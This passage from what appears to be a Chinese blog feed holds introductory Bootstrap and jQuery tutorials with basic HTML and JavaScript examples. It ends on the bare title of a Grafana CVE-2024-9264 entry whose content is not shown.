punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap 网格示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、常见的组件示例"><a href="#四、常见的组件示例" class="headerlink" title="四、常见的组件示例"></a>四、常见的组件示例</h1><h2 id="4-1-按钮"><a href="#4-1-按钮" class="headerlink" title="4.1 按钮"></a>4.1 按钮</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>主按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>次按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-2-导航栏"><a href="#4-2-导航栏" class="headerlink" title="4.2 导航栏"></a>4.2 导航栏</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-expand-lg navbar-light bg-light<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Logo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler-icon<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link active<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>功能<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>联系<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-3-模态框"><a href="#4-3-模态框" class="headerlink" title="4.3 模态框"></a>4.3 模态框</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 触发按钮 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#exampleModal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    打开模态框<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 模态框 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal fade<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exampleModal<span class="token punctuation">"</span></span> <span class="token attr-name">tabindex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-dialog<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>模态框标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn-close<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                这是模态框的内容。            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-footer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>关闭<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>保存更改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、优点与不足"><a href="#五、优点与不足" class="headerlink" title="五、优点与不足"></a>五、优点与不足</h1><h2 id="5-1-优点"><a href="#5-1-优点" class="headerlink" title="5.1 优点"></a>5.1 <strong>优点</strong></h2><ul><li>快速开发：减少 CSS 和 JavaScript 的重复工作。</li><li>高质量：提供一致的视觉和功能体验。</li><li>大量社区支持和插件。</li></ul><h2 id="5-2-不足"><a href="#5-2-不足" class="headerlink" title="5.2 不足"></a>5.2 <strong>不足</strong></h2><ul><li>样式可能显得过于通用，缺乏个性化。</li><li>对小型项目可能显得繁重。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Bootstrap 是前端开发的强大工具，特别适用于需要快速开发、响应式设计和一致性体验的项目。尽管现代前端框架（如 React 和 Vue）提供了更多交互功能，但 Bootstrap 在传统网站开发中仍具有重要地位。</p>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> Bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/jquery/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/jquery/</url>
      
        <content type="html"><![CDATA[<h1 id="一、jQuery简介"><a href="#一、jQuery简介" class="headerlink" title="一、jQuery简介"></a>一、jQuery简介</h1><p>jQuery 是一个快速、简洁、跨平台的 JavaScript 库，专为简化 HTML 文档操作、事件处理、动画制作以及与服务器端的交互（Ajax）而设计。它由 John Resig 于 2006 年创建，现已成为前端开发中最广泛使用的工具之一。</p><p>虽然 jQuery 曾在前端开发中占据主导地位，但随着现代框架（如 React、Vue、Angular）的崛起，它的使用有所减少。然而，由于其简单性和广泛支持，jQuery 在许多项目中仍然有一席之地，尤其是在需要快速开发或维护旧项目时。</p><h1 id="二、-jQuery-核心特点"><a href="#二、-jQuery-核心特点" class="headerlink" title="二、 jQuery 核心特点"></a>二、 jQuery 核心特点</h1><h3 id="1-跨浏览器兼容性"><a href="#1-跨浏览器兼容性" class="headerlink" title="1. 跨浏览器兼容性"></a>1. <strong>跨浏览器兼容性</strong></h3><p>jQuery 解决了不同浏览器对 JavaScript 的实现差异，提供统一的接口，使开发者能更轻松地编写跨浏览器的代码。</p><h3 id="2-简化-DOM-操作"><a href="#2-简化-DOM-操作" class="headerlink" title="2. 简化 DOM 操作"></a>2. <strong>简化 DOM 操作</strong></h3><p>通过 jQuery，开发者可以用简单、直观的语法轻松地选择、操作 HTML 元素。例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 使用 jQuery 修改元素内容</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"新的内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-事件处理"><a href="#3-事件处理" class="headerlink" title="3. 事件处理"></a>3. <strong>事件处理</strong></h3><p>jQuery 提供了简便的事件绑定和解绑方法，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 为按钮绑定点击事件</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"按钮被点击！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-动画与效果"><a href="#4-动画与效果" class="headerlink" title="4. 动画与效果"></a>4. <strong>动画与效果</strong></h3><p>jQuery 内置多种动画效果，可以快速实现页面动态效果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 淡入元素</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-Ajax-支持"><a href="#5-Ajax-支持" class="headerlink" title="5. Ajax 支持"></a>5. <strong>Ajax 支持</strong></h3><p>jQuery 提供了方便的 Ajax 方法，可以轻松与服务器交互：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 通过 jQuery 发起 GET 请求</span>$<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"example.com/api"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-丰富的插件生态"><a href="#6-丰富的插件生态" class="headerlink" title="6. 丰富的插件生态"></a>6. <strong>丰富的插件生态</strong></h3><p>jQuery 拥有大量第三方插件，可以扩展其功能，满足特定需求。</p><h3 id="7-链式调用"><a href="#7-链式调用" class="headerlink" title="7. 链式调用"></a>7. <strong>链式调用</strong></h3><p>jQuery 的链式调用特性允许在一条语句中连续调用多个方法，从而使代码更加简洁：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"highlight"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"更新内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-轻量级"><a href="#8-轻量级" class="headerlink" title="8. 轻量级"></a>8. <strong>轻量级</strong></h3><p>尽管功能强大，jQuery 的核心库大小较小，加载速度快。</p><h1 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"&lt;url id="</span><span class="token string">" type="</span>url<span class="token string">" status="</span><span class="token string">" title="</span><span class="token string">" wc="</span><span class="token string">"&gt;https://code.jquery.com/jquery-3.6.0.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>        <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#toggleButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"toggleButton"</span><span class="token operator">&gt;</span>切换显示<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>p id<span class="token operator">=</span><span class="token string">"message"</span><span class="token operator">&gt;</span>这是一个可切换的段落。<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这是一个完整且简单的 jQuery 示例代码。它展示了如何使用 jQuery 实现事件处理和元素的显示/隐藏效果。</p><h3 id="功能说明"><a href="#功能说明" class="headerlink" title="功能说明"></a>功能说明</h3><ol><li><strong>加载 jQuery</strong><br>在 <code>&lt;head&gt;</code> 部分通过 <code>&lt;script&gt;</code> 标签加载了 jQuery 的官方库（版本 3.6.0）。</li><li><strong>DOM 准备就绪处理</strong><br>使用 <code>$(document).ready()</code> 确保在 DOM 加载完成后再执行代码。</li><li><strong>按钮点击事件</strong><br>当用户点击按钮（ID 为 <code>toggleButton</code>）时，会触发绑定的事件处理器。</li><li><strong>切换显示/隐藏</strong><br><code>$("#message").toggle();</code> 方法会在每次点击按钮时切换段落（ID 为 <code>message</code>）的显示状态。</li></ol><h3 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h3><p>初始状态下，页面上显示一个按钮和一段文字。</p><p>点击按钮后，文字会消失。</p><p>再次点击按钮，文字重新出现。</p><h3 id="扩展功能"><a href="#扩展功能" class="headerlink" title="扩展功能"></a>扩展功能</h3><p>如果你想增加一些效果，比如使用动画，可以替换 <code>toggle</code> 为 <code>fadeToggle</code> 或 <code>slideToggle</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用淡入淡出效果切换</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Grafana表达式远程代码执行(CVE-2024-9264)</title>
      <link href="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/"/>
      <url>/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/</url>
      
